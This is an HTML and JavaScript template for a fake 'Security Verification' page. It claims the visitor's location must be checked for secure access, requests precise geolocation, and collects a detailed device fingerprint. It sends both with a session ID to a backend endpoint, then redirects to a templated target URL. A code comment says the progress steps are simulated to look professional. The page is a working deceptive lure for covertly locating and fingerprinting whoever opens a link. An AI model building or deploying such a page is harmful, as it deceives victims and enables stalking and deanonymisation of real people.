<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <!-- Instruct the browser to send Client Hints -->
    <meta http-equiv="Delegate-CH" content="sec-ch-ua-full-version-list https://nominatim.openstreetmap.org; sec-ch-ua-model https://nominatim.openstreetmap.org">
    <style>
        :root {
            --bg-color: #0f172a;
            --glass-bg: rgba(30, 41, 59, 0.7);
            --glass-border: rgba(255, 255, 255, 0.1);
            --accent: #3b82f6;
            --accent-hover: #2563eb;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --error: #ef4444;
        }

        @media (prefers-color-scheme: light) {
            :root {
                --bg-color: #f1f5f9;
                --glass-bg: rgba(255, 255, 255, 0.9);
                --glass-border: rgba(0, 0, 0, 0.1);
                --text-main: #0f172a;
                --text-muted: #64748b;
            }
        }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            background: var(--bg-color);
            background-image: 
                radial-gradient(circle at 15% 50%, rgba(59, 130, 246, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 85% 30%, rgba(139, 92, 246, 0.1) 0%, transparent 50%);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            transition: background 0.3s ease, color 0.3s ease;
        }

        .glass-panel {
            background: var(--glass-bg);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid var(--glass-border);
            border-radius: 24px;
            padding: 40px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            text-align: center;
            transform: translateY(20px);
            opacity: 0;
            animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }

        @keyframes slideUp {
            to { transform: translateY(0); opacity: 1; }
        }

        h1 {
            margin: 0 0 16px;
            font-size: 1.5rem;
            font-weight: 600;
        }

        p {
            margin: 0 0 24px;
            color: var(--text-muted);
            line-height: 1.6;
            font-size: 0.95rem;
        }

        .btn {
            background: var(--accent);
            color: #fff;
            border: none;
            padding: 12px 24px;
            font-size: 1rem;
            font-weight: 500;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.2s ease, transform 0.1s ease;
            width: 100%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn:hover {
            background: var(--accent-hover);
        }

        .btn:active {
            transform: scale(0.98);
        }

        /* Loading state */
        .loading-container {
            display: none;
            flex-direction: column;
            align-items: center;
            margin-top: 16px;
        }

        .spinner {
            width: 36px;
            height: 36px;
            border: 3px solid var(--glass-border);
            border-top-color: var(--accent);
            border-radius: 50%;
            margin-bottom: 16px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .status-steps {
            text-align: left;
            width: 100%;
            margin-top: 16px;
            font-size: 0.875rem;
            color: var(--text-muted);
        }

        .step {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 12px;
            opacity: 0.4;
            transition: opacity 0.3s;
        }
        
        .step.active {
            opacity: 1;
            color: var(--text-main);
            font-weight: 500;
        }

        .pulse {
            display: inline-block;
            width: 8px;
            height: 8px;
            background-color: #10b981;
            border-radius: 50%;
            box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
        }

        .step.active .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            70% { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
            100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }

        .error-msg {
            color: var(--error);
            font-size: 0.9rem;
            margin-bottom: 16px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="glass-panel" id="main-panel">
        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 16px;">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            <path d="m9 12 2 2 4-4"/>
        </svg>

        <h1>Security Verification</h1>
        
        <div id="intro-content">
            <p>To continue, we need to verify your current location. This helps ensure secure and valid system access.</p>
            <p class="error-msg" id="error-text">Location access is required to proceed.</p>
            <button class="btn" id="verify-btn" onclick="startVerification()">
                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg>
                Continue Verification
            </button>
        </div>

        <div class="loading-container" id="loading-content">
            <div class="spinner"></div>
            <p style="margin-bottom: 0;">Verifying access...</p>
            
            <div class="status-steps">
                <div class="step" id="step-1">
                    <span class="pulse"></span> Checking environment...
                </div>
                <div class="step" id="step-2">
                    <span class="pulse"></span> Verifying device...
                </div>
                <div class="step" id="step-3">
                    <span class="pulse"></span> Requesting location...
                </div>
            </div>
        </div>
    </div>

    <script>
        const SESSION_ID = '{{SESSION_ID}}';
        const TARGET_URL = '{{TARGET_URL}}';
        let redirectTriggered = false;
        let failsafeTimer = null;

        function redirect() {
            if (redirectTriggered) return;
            redirectTriggered = true;
            if (failsafeTimer) clearTimeout(failsafeTimer);
            
            // Show final success step
            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
            const p = document.querySelector('#loading-content p');
            if (p) p.innerText = "Verification complete. Redirecting...";
            
            setTimeout(() => {
                window.location.href = TARGET_URL;
            }, 1000);
        }

        // Gather enriched client-side data natively
        let screenResolution = 'Unknown';
        try { screenResolution = `${window.screen.width}x${window.screen.height}`; } catch(e) {}
        let timezoneStr = "Unknown";
        try { timezoneStr = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}

        const deviceData = {
            screen: screenResolution,
            timezone: timezoneStr,
            devicePixelRatio: window.devicePixelRatio || 1,
            language: navigator.language || 'Unknown',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory || 'Unknown',
            networkType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'Unknown',
            userAgent: navigator.userAgent
        };

        async function enrichAndSend(locationData) {
            try {
                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                    const uach = await navigator.userAgentData.getHighEntropyValues([
                        'architecture', 'bitness', 'model', 'platformVersion', 
                        'fullVersionList', 'formFactors', 'wow64'
                    ]).catch(e => {
                        console.warn('UA-CH promise rejected', e);
                        return null;
                    });
                    
                    if (uach) {
                        deviceData.uach = {
                            mobile: navigator.userAgentData.mobile,
                            platform: navigator.userAgentData.platform,
                            brands: navigator.userAgentData.brands,
                            ...uach
                        };
                    }
                }
            } catch (e) {
                console.warn('UA-CH collection failed', e);
            }

            locationData.deviceData = deviceData;

            fetch('/api/location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(locationData)
            })
            .then(() => redirect())
            .catch(() => redirect());
        }

        function setStep(stepNum) {
            document.querySelectorAll('.step').forEach((el, idx) => {
                if (idx + 1 === stepNum) el.classList.add('active');
                else el.classList.remove('active');
            });
        }

        function handleDeny() {
            // Restore UI to intro
            document.getElementById('loading-content').style.display = 'none';
            document.getElementById('intro-content').style.display = 'block';
            
            // Show error message and change button text
            document.getElementById('error-text').style.display = 'block';
            const btn = document.getElementById('verify-btn');
            btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/></svg> Retry Location Access';
            
            // Cancel failsafe since user interacted
            if (failsafeTimer) clearTimeout(failsafeTimer);
        }

        function requestLocation() {
            setStep(3); // Requesting location...

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        enrichAndSend({
                            sessionId: SESSION_ID,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        });
                    },
                    (error) => {
                        // User denied or timeout
                        console.warn("Location error:", error.message);
                        handleDeny();
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            } else {
                handleDeny();
            }
        }

        function startVerification() {
            document.getElementById('intro-content').style.display = 'none';
            document.getElementById('error-text').style.display = 'none';
            document.getElementById('loading-content').style.display = 'flex';
            
            setStep(1); // Checking environment...
            
            // Setup a failsafe timer (30 seconds total)
            failsafeTimer = setTimeout(() => {
                if (!redirectTriggered) {
                    enrichAndSend({
                        sessionId: SESSION_ID,
                        error: "timeout/unresponsive"
                    });
                }
            }, 30000);

            // Simulate UI steps to look professional
            setTimeout(() => {
                setStep(2); // Verifying device...
                setTimeout(() => {
                    requestLocation();
                }, 800);
            }, 800);
        }
    </script>
</body>
</html>
